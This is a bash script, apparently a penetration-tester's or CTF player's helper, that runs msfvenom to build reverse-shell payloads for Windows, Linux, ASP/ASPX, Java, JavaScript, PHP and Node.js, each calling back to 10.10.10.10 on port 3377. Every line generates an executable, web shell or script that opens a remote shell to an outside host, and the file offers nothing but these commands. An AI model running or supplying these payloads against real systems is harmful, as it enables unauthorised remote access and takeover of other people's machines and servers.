#!/bin/bash

## Windows
#Stageless Payloads
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe -o ~/reverse-shell/shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/shell.bin
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f hex -o ~/reverse-shell/shell.hex

#x64 Stageless Payloads
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe -o ~/reverse-shell/x64_shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/x64_shell.bin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f hex -o ~/reverse-shell/x64_shell.hex

#Staged Payloads
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe -o ~/reverse-shell/s-shell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/s-shell.bin

#x64 Staged Payloads
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe -o ~/reverse-shell/x64_s-shell.exe
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/x64_s-shell.bin

##Linux
msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/shell.py
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=3377 -f raw -o shell.pl

#Staged Payloads
msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf -o ~/reverse-shell/s-shell-x86.elf
msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf -o ~/reverse-shell/s-shell-x64.elf

#Stageless Payloads
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf -o ~/reverse-shell/shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf -o ~/reverse-shell/shell-x64.elf

##ASP/ASPX
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f asp -o ~/reverse-shell/s-shell.asp
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f asp -o ~/reverse-shell/shell.asp
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f aspx -o ~/reverse-shell/shell.aspx
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f aspx -o ~/reverse-shell/s-shell.aspx

##Java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f war -o ~/reverse-shell/shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/shell.jsp
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f war -o ~/reverse-shell/shell2.war

##Javascript
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f js_le -e generic/none -o ~/reverse-shell/shell-win.js
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 CMD=/bin/bash -f js_le -e generic/none -o ~/reverse-shell/shell-lin.js

##PHP
msfvenom -p php/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/shell.php
cat ~/reverse-shell/shell.php | pbcopy && echo '<?php ' | tr -d '\n' > ~/reverse-shell/shell.php && pbpaste >> ~/reverse-shell/shell.php

##NodeJs
msfvenom -p nodejs/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/node-shell.js
